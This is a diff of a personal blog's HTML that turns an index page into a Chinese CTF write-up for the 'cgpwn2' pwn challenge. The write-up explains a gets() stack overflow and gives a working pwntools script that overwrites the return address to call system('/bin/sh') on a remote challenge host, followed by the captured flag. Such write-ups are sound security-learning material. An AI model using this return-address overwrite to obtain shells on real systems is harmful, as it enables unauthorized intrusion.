@@ -16,21 +16,36 @@
   <meta name="author" content="Sinky">
   <meta name="keywords" content="">
   
-    <meta property="og:type" content="website">
-<meta property="og:title" content="Sinky&#39;s Blog">
-<meta property="og:url" content="https://github.com/SinkyQ/sinkyhexo.github.io.git/page/2/index.html">
+    <meta name="description" content="算是简单题，进入hello()函数中发现gets(&amp;s) 栈溢出漏洞。 name是全局变量，在bss区段，适合写入。 pwn()函数中调用了__system，但并没有‘&#x2F;bin&#x2F;sh’    攻击思路在name中写入’&#x2F;bin&#x2F;sh’。利用栈溢出覆盖返回地址，使函数返回到system上，拿到shell。 payload&#x3D;填充栈+覆盖保存的exp的值4字节+假的返回地址call __syst">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界 cgpwn2">
+<meta property="og:url" content="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/index.html">
 <meta property="og:site_name" content="Sinky&#39;s Blog">
+<meta property="og:description" content="算是简单题，进入hello()函数中发现gets(&amp;s) 栈溢出漏洞。 name是全局变量，在bss区段，适合写入。 pwn()函数中调用了__system，但并没有‘&#x2F;bin&#x2F;sh’    攻击思路在name中写入’&#x2F;bin&#x2F;sh’。利用栈溢出覆盖返回地址，使函数返回到system上，拿到shell。 payload&#x3D;填充栈+覆盖保存的exp的值4字节+假的返回地址call __syst">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/05/08/veR8Fb2xkDMifVz.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/08/QPL4xp8Wws1DJUc.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/08/abOyYLf9FERVqvZ.png">
+<meta property="article:published_time" content="2022-08-09T03:17:04.188Z">
+<meta property="article:modified_time" content="2020-09-10T07:29:13.987Z">
 <meta property="article:author" content="Sinky">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i.loli.net/2020/05/08/veR8Fb2xkDMifVz.png">
   
   
   
-  <title>Sinky&#39;s Blog</title>
+  <title>攻防世界 cgpwn2 - Sinky&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
 
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
 
 
 
@@ -83,7 +98,7 @@
   <header>
     
 
-<div class="header-inner" style="height: 100vh;">
+<div class="header-inner" style="height: 70vh;">
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand" href="/SinkyQ/sinkyhexo.github.io.git/">
@@ -188,17 +203,53 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="心之所向，素履以往，生如逆旅，一苇以航"></span>
+            <span id="subtitle" data-typed-text="攻防世界 cgpwn2"></span>
           
         </div>
 
         
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-08-09 11:17" pubdate>
+          August 9, 2022 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          628 words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          6 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
       </div>
 
-      
-        <div class="scroll-down-bar">
-          <i class="iconfont icon-arrowdown"></i>
-        </div>
       
     </div>
   </div>
@@ -210,184 +261,175 @@
 
   <main>
     
-      <div class="container nopadding-x-md">
-        <div id="board"
-          style="margin-top: 0">
-          
-          <div class="container">
-            <div class="row">
-              <div class="col-12 col-md-10 m-auto">
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">攻防世界 cgpwn2</h1>
+            
+            
+              <div class="markdown-body">
                 
+                <p>算是简单题，进入hello()函数中发现gets(&amp;s) 栈溢出漏洞。</p>
+<p>name是全局变量，在bss区段，适合写入。</p>
+<p>pwn()函数中调用了__system，但并没有‘/bin/sh’</p>
+<p><img src="https://i.loli.net/2020/05/08/veR8Fb2xkDMifVz.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="17627983-d0f4027f425eadcd.png"></p>
+<p><img src="https://i.loli.net/2020/05/08/QPL4xp8Wws1DJUc.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="17627983-8f37fec1f7e9fab3.png"></p>
+<p><img src="https://i.loli.net/2020/05/08/abOyYLf9FERVqvZ.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="17627983-a19abf21a8c9c0f7.png"></p>
+<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>在name中写入’/bin/sh’。利用栈溢出覆盖返回地址，使函数返回到system上，拿到shell。</p>
+<p>payload=填充栈+覆盖保存的exp的值4字节+假的返回地址call __system(‘/bin/sh’)</p>
+<figure class="highlight clean"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> # p = process(<span class="hljs-string">'./cgpwn2'</span>)<br>p = remote(<span class="hljs-string">"111.198.29.45"</span>,<span class="hljs-number">32966</span>)<br>system_addr = <span class="hljs-number">0x804855A</span><br>bss_addr = <span class="hljs-number">0x804A080</span><br>p.recvuntil(<span class="hljs-string">'name\n'</span>)<br>p.sendline(<span class="hljs-string">"/bin/sh\x00"</span>)<br>p.recvuntil(<span class="hljs-string">'here:\n'</span>)<br>payload = <span class="hljs-number">0x26</span>*<span class="hljs-string">'a'</span> +<span class="hljs-string">'bbbb'</span>+ p32(system_addr) + p32(bss_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>
 
+<p>cyberpeace{f92dbe7e38fed8edda8b7513b09acdc7}</p>
 
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/" target="_self">
-          pikachu漏洞练习记录1
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/" target="_self">
-        <div>
-          0x01 暴力破解基于表单的暴力破解开启bp抓包，对username,password字段的字典做爆破，得到admin&#x2F;123456. 验证码绕过(on server)随意输入账户密码，bp抓包，发送到重发器，修改密码后重新发送，发现未报错验证码错误，证明验证码没有进行时效性验证，可重复提交使用。 将流量包发送到测试器，对用户名和密码进行字典爆破，登录成功。 验证码绕过(on client)同上步
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2022-08-09 11:17" pubdate>
-              2022-08-09
-            </time>
-          </div>
-        
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/SinkyQ/sinkyhexo.github.io.git/tags/web/">#web</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/JIT%E5%AD%A6%E4%B9%A0/" target="_self">
-          JIT学习
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/JIT%E5%AD%A6%E4%B9%A0/" target="_self">
-        <div>
-          JIT原理Just In Time编译，也叫运行时编译，不同于C&#x2F;C++语言直接被翻译成机器指令，javac把java的源文件翻译成了class文件，而class文件中全都是java字节码，那么，JVM在加载了这些class文件以后，针对这些字节码，逐条取出，逐条执行，这种方法就是解释执行。 还有一种，就是将java字节码重新编译优化，生成机器码，让CPU直接执行，这样编出来的代码效率更高，通常我
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2022-08-09 11:17" pubdate>
-              2022-08-09
-            </time>
-          </div>
-        
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/SinkyQ/sinkyhexo.github.io.git/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/">#chrome知识点</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/Dlink-Dir-823G%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/" target="_self">
-          Dlink DIR-823G 漏洞挖掘过程
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/Dlink-Dir-823G%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/" target="_self">
-        <div>
-          固件下载地址： https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1YDuLaqdiDYXfkxJsjRqPNA 提取码：1ly1 0x01 漏洞介绍D-Link DIR-823G命令注入漏洞： CVE编号：CVE-2019-15529 D-Link DIR-823G是中国台湾友讯（D-Link）公司的一款无线路由器。使用1.0.2B05版本固件的D-Link DIR-823G中的HNAP1存在命令
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2022-08-09 11:17" pubdate>
-              2022-08-09
-            </time>
-          </div>
-        
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/SinkyQ/sinkyhexo.github.io.git/tags/IOT/">#IOT</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/SinkyQ/sinkyhexo.github.io.git/2022/08/07/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" target="_self">
-          Win10下使用Hexo搭建个人博客
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/sinkyhexo.github.io.git/2022/08/07/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" target="_self">
-        <div>
-          下载安装git、nodejs下载地址:  git: https:&#x2F;&#x2F;git-scm.com&#x2F;  nodejs: http:&#x2F;&#x2F;nodejs.cn&#x2F;download&#x2F; 将nodejs加入path环境变量中。打开cmd测试：   报错1：输入 npm-v 出现报错:  npm WARN config global --global, --local are deprecated. Use &#96;–loca
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2022-08-07 16:48" pubdate>
-              2022-08-07
-            </time>
-          </div>
-        
-        
-        
-      </div>
-    </article>
-  </div>
-
-
-
-  <nav aria-label="navigation">
-    <span class="pagination" id="pagination">
-      <a class="extend prev" rel="prev" href="/SinkyQ/sinkyhexo.github.io.git/"><i class="iconfont icon-arrowleft"></i></a><a class="page-number" href="/SinkyQ/sinkyhexo.github.io.git/">1</a><span class="page-number current">2</span>
-    </span>
-  </nav>
-
-
-
+                
               </div>
-            </div>
-          </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/SinkyQ/sinkyhexo.github.io.git/tags/pwn/">#pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>攻防世界 cgpwn2</div>
+      <div>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/攻防世界pwn-cgpwn2/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Sinky</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 9, 2022</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>Licensed under</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
         </div>
       </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E3%80%8AARM%E5%B5%8C%E5%85%A5%E5%BC%8FLinux%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/" title="《ARM嵌入式Linux系统开发详解》学习笔记1">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">《ARM嵌入式Linux系统开发详解》学习笔记1</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/" title="攻防世界pwn-100">
+                        <span class="hidden-mobile">攻防世界pwn-100</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
     
 
     
@@ -481,6 +523,72 @@
 
 
 
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
 
   <script  src="/SinkyQ/sinkyhexo.github.io.git/js/local-search.js" ></script>
 
